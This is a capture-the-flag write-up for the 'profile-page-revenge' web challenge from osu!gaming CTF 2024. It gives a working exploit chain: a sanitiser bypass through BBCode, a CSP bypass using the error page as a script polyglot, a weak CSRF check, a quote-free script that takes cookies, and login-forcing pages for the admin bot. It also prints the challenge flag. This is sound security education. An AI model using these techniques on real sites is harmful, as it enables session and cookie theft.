---
title: profile-page-revenge
date: 2024-03-07
tags: 
- web
- csp
- csrf
- polyglot
- error
- xss
- cookies
- author-hartmannsyg
categories: osu!gaming CTF 2024
---

written by {% person hartmannsyg %}

This is effectively a "notes" challenge, where you are able to edit your own bio (given a csrf and cookies). You can give a url for the admin bot to visit.

{% ccb lang:html gutter1:164-179 highlight:13 caption:/profile %}
<iframe sandbox="allow-scripts allow-same-origin" srcdoc="
  <head>
    <script src='snow.js' nonce='...'></script>
    <script src='antixss.js' nonce='...'></script>
    <style nonce='...'>
      * {
        color: white;
        font-family: Torus, Inter, Arial;
      }
    </style>
  </head>
  <body>
    bio
    <script src='bio.js'></script>
  </body>
"></iframe>
{% endccb %}

We see that our bio is being reflected. If we try to insert a script tag `<script>alert(1)</script>`

{% ccb lang:html gutter1:164-179 highlight:13 caption:/profile %}
<iframe sandbox="allow-scripts allow-same-origin" srcdoc="
  <head>
    <script src='snow.js' nonce='...'></script>
    <script src='antixss.js' nonce='...'></script>
    <style nonce='...'>
      * {
        color: white;
        font-family: Torus, Inter, Arial;
      }
    </style>
  </head>
  <body>
    &lt;script'&gt;alert(1)&lt;/script&gt;
    <script src='bio.js'></script>
  </body>
"></iframe>
{% endccb %}

However, it seems like these brackets are being escaped

## Bypassing of angled brackets

{% ccb lang:js gutter1:42-64 highlight:15 caption:app.js %}
const window = new JSDOM('').window;
const purify = DOMPurify(window);
const renderBBCode = (data) => {
    data = data.replaceAll(/\[b\](.+?)\[\/b\]/g, '<strong>$1</strong>');
    data = data.replaceAll(/\[i\](.+?)\[\/i\]/g, '<i>$1</i>');
    data = data.replaceAll(/\[u\](.+?)\[\/u\]/g, '<u>$1</u>');
    data = data.replaceAll(/\[strike\](.+?)\[\/strike\]/g, '<strike>$1</strike>');
    data = data.replaceAll(/\[color=#([0-9a-f]{6})\](.+?)\[\/color\]/g, '<span style="color: #$1">$2</span>');
    data = data.replaceAll(/\[size=(\d+)\](.+?)\[\/size\]/g, '<span style="font-size: $1px">$2</span>');
    data = data.replaceAll(/\[url=(.+?)\](.+?)\[\/url\]/g, '<a href="$1">$2</a>');
    data = data.replaceAll(/\[img\](.+?)\[\/img\]/g, '<img src="$1" />');
    return data;
};
const renderBio = (data) => {
    data = data.replaceAll(/</g, "&lt;").replaceAll(/>/g, "&gt;");
    const html = renderBBCode(data);
    const sanitized = purify.sanitize(html);
    // do this after sanitization because otherwise iframe will be removed
    return sanitized.replaceAll(
        /\[youtube\](.+?)\[\/youtube\]/g,
        '<iframe sandbox="allow-scripts" width="640px" height="480px" src="https://www.youtube.com/embed/$1" frameborder="0" allowfullscreen></iframe>'
    );
};
{% endccb %}

If we use `renderBBCode()` to insert an `img` tag with `[img]aaa[/img]`, we do not get escaped angled brackets:

```html
<img src="aaa"/>
```

Now we need some way to input `"` without it being escaped or being sanitized by DOMPurify. Since the `[youtube][/youtube]` replacement occurs *after* sanitize, we can construct a payload like: `[img][youtube]a[/youtube]<h1>balls</h1>[/img]`:

{% ccb lang:html wrapped:true caption:/profile %}
<img src="<iframe sandbox="allow-scripts" width="640px" height="480px" src="https://www.youtube.com/embed/a" frameborder="0" allowfullscreen></iframe><h1>balls</h1>">
{% endccb %}

## error message javascript polyglot

When we try inserting `<script>console.log(1)</script>`, we get blocked by the csp:

{% ccb terminal:true html:true wrapped:true %}
<span style='color:#E06C75;'>Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self' 'nonce-fcc0b4e554c5e49991b7650ecaedb2d7b41eb317336cbe78885bdd8b09571bb3'". Either the 'unsafe-inline' keyword, a hash ('sha256-CihokcEcBW4atb/CW/XWsvWwbTjqwQlE9nj9ii5ww5M='), or a nonce ('nonce-...') is required to enable inline execution.
</span>
{% endccb %}

However, this line of code effectively allows us to reflect scripts:

{% ccb lang:js gutter1:150-154 highlight:4 caption:app.js %}
app.get('*', (req, res) => {
    res.set("Content-Type", "text/plain");
    res.status = 404;
    res.send(`Error: ${req.originalUrl} was not found`);
});
{% endccb %}

i.e. `https://profile-page-revenge.web.osugaming.lol/**/console.log(1)//` gives
```js
Error: /**/console.log(1)// was not found
```
which is valid js! So we can input `<script src='/**/console.log(1)//'></script>`. The only issue is that we cannot use quotes but that can be bypassed

## csrf check is wonk

I believe this was also a problem in the previous profile-page challenge

{% ccb lang:js gutter1:121-143 highlight:13 caption:app.js %}
// TODO: update bio from UI
app.post("/api/update", requiresLogin, (req, res) => {
    const { bio } = req.body;

    if (!bio || typeof bio !== "string") {
        return res.end("missing bio");
    }

    if (!req.headers.csrf) {
        return res.end("missing csrf token");
    }

    if (req.headers.csrf !== req.cookies.csrf) {
        return res.end("invalid csrf token");
    }

    if (bio.length > 2048) {
        return res.end("bio too long");
    }

    req.user.bio = renderBio(bio);
    res.send(`Bio updated!`);
});
{% endccb %}

the csrf cookie only needs to be the same as the header, it does not check for the actual value of the csrf cookie

## Bypassing antixss.js and snow.js

### Make them not load

If we set our website to `https://profile-page-revenge.web.osugaming.lol/profile/` instead of `https://profile-page-revenge.web.osugaming.lol/profile` (extra `/` at the end), these anti-xss script tags:
```html
<script src='snow.js' nonce='...'></script>
<script src='antixss.js' nonce='...'></script>
...
<script src='bio.js'></script>
```
will request from `/profile/snow.js`, `/profile/antixss.js`, etc... which do not exist. Hence all the blocking will not work.

afaik there are other methods might write them

## XSS

We basically need to `fetch('/api/update')` with `document.cookie`

<details>
<summary>Note that we cannot fetch our webhook as we cannot do cross-site requests</summary>

{% ccb html:true terminal:true wrapped:true %}
<span style='color:#E06C75;'>Refused to connect to 'https://webhook.site/...' because it violates the following Content Security Policy directive: "default-src https://osugaming.lol 'self'". Note that 'connect-src' was not explicitly set, so 'default-src' is used as a fallback.</span>
{% endccb %}
</details>

without using quotes. There are many ways to get strings, but one of them is using regex (e.g. `/balls/.source` = `"balls"`). However, we can't use `/` in the regex, so we can use `String.fromCharCode(47)`

{% ccb lang:js caption:'xss script' gutter1:1-9 %}
headers=Object();
headers[/csrf/.source] = 2;
headers[/Content-Type/.source]=/application/.source+String.fromCharCode(47)+/x-www-form-urlencoded/.source;
opts=Object();
opts[/method/.source]=/POST/.source;
opts[/body/.source]=/bio=/.source+document.cookie;
opts[/headers/.source]=headers;
document.cookie=/csrf=2;Path=/.source+String.fromCharCode(47);
fetch(String.fromCharCode(47)+/api/.source+String.fromCharCode(47)+/update/.source,opts)
{% endccb %}

which when condensed gives:

{% ccb lang:js caption:'xss script' wrapped:true %}
headers=Object();headers[/csrf/.source]=2;headers[/Content-Type/.source]=/application/.source+String.fromCharCode(47)+/x-www-form-urlencoded/.source;opts=Object();opts[/method/.source]=/POST/.source;opts[/body/.source]=/bio=/.source+document.cookie;opts[/headers/.source]=headers;document.cookie=/csrf=2;Path=/.source+String.fromCharCode(47);fetch(String.fromCharCode(47)+/api/.source+String.fromCharCode(47)+/update/.source,opts)
{% endccb %}

## Payload

The admin bot only sets a cookie, it does not log into any "admin" account:

{% ccb lang:js gutter1:24-37 caption:adminbot_test.js highlight:5 %}
        let page = await browser.newPage();
        await page.goto(SITE, { timeout: 3000, waitUntil: 'domcontentloaded' });

        await page.evaluate((flag) => {
            document.cookie = "flag=" + flag + "; secure; path=/";
        }, FLAG);

        await page.close();
        page = await browser.newPage();

        await page.goto(url, { timeout: 3000, waitUntil: 'domcontentloaded' })
        await sleep(5000);

        await browser.close();
{% endccb %}

So we need to serve a website that will login to our account:

{% ccb lang:html caption:login.html gutter1:1-9 highlight:7 %}
<form action="https://profile-page-revenge.web.osugaming.lol/api/login" method="POST">
    <input name="username" value="hartmannsyg" />
    <input name="password" value="hartmannsyg" />
</form>
  
<script>
    window.open('/xss.html')
    document.forms[0].submit();
</script>
{% endccb %}

{% ccb lang:html caption:xss.html gutter1:1-3 %}
<script>
    setTimeout(()=>{window.open("https://profile-page-revenge.web.osugaming.lol/profile/")},500) 
</script>
{% endccb %}

So, when the admin bot visits `/login.html`:

- new `/xss.html` pops up
- form in `/login.html` submits, setting the cookies so that we are already logged in
- `/xss.html` finally opens to `/profile/`, triggering the xss
- xss script steals the cookies, sets bio to be the cookies

![](../static/osu!gamingCTF2024/profile-page-revenge.png)

The flag is `osu{xss_1s_inevitabl3}`
